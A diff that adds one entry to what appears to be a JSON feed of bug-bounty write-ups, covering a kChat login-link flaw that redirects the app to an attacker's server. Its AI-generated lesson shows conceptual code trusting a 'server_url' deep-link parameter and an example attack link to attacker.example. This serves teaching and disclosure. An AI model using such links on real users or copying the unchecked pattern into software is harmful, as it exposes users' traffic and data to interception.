@@ -1,5 +1,45 @@
 [
   {
+    "id": "eb920c015d3b",
+    "title": "How a Login Link Could Switch kChat to an Attacker’s Server",
+    "url": "https://medium.com/@debasishtripathy7987/how-a-login-link-could-switch-kchat-to-an-attackers-server-6a1601e3cd9a",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Debasishtripathy"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-17T12:17:19.000Z",
+    "added_at": "2026-11-17T20:46:35.520Z",
+    "categories": [
+      "access-control"
+    ],
+    "severity": "high",
+    "difficulty": null,
+    "summary_en": "A vulnerability in kChat allowed an attacker to redirect the application to a malicious server via a specially crafted login link.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": null,
+      "walkthrough": null,
+      "example": "We assume a mobile application uses a Deep Link (a special URL designed to trigger an action inside an app) to allow users to connect to different corporate servers.\n\nVulnerable Code (Conceptual):\nString userServer = uri.getQueryParameter(\"server_url\");\nthis.config.setApiBase(userServer);\n\nAttack Link:\nmychat://setup?server_url=https://attacker.example\n\nWhy: The application retrieves the 'server_url' parameter (a piece of data following the question mark in a URL) and immediately updates its internal configuration to use that address. Because the app does not verify if the URL belongs to a trusted domain, it will now send all future HTTP requests (web messages containing sensitive data) to the attacker's server. A beginner can think of this like a GPS app that lets a link change your 'Home' address to the thief's house without asking for confirmation.",
+      "takeaway": null,
+      "fix": null,
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": null,
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "466dace8a94a",
     "title": "How Trusting a Request Header Turned a Password Reset Into Account Takeover",
     "url": "https://medium.com/@l4zz3rj0d/how-trusting-a-request-header-turned-a-password-reset-into-account-takeover-b95223be8c94",
